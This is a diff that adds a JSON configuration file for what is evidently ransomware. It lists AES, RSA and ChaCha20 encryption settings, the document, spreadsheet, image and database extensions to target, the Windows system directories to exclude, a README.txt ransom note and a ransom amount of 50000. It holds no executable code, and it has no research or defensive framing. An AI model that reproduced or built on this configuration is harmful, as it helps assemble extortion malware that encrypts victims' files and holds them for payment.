@@ -1,0 +1,11 @@
+{
+  "algorithms": {
+    "symmetric": "AES-256-CBC",
+    "asymmetric": "RSA-2048",
+    "data_encryption": "ChaCha20"
+  },
+  "file_extensions": [".doc", ".xls", ".pdf", ".jpg", ".db"],
+  "exclude_dirs": ["Windows", "Program Files"],
+  "ransom_note": "README.txt",
+  "ransom_amount": 50000
+}
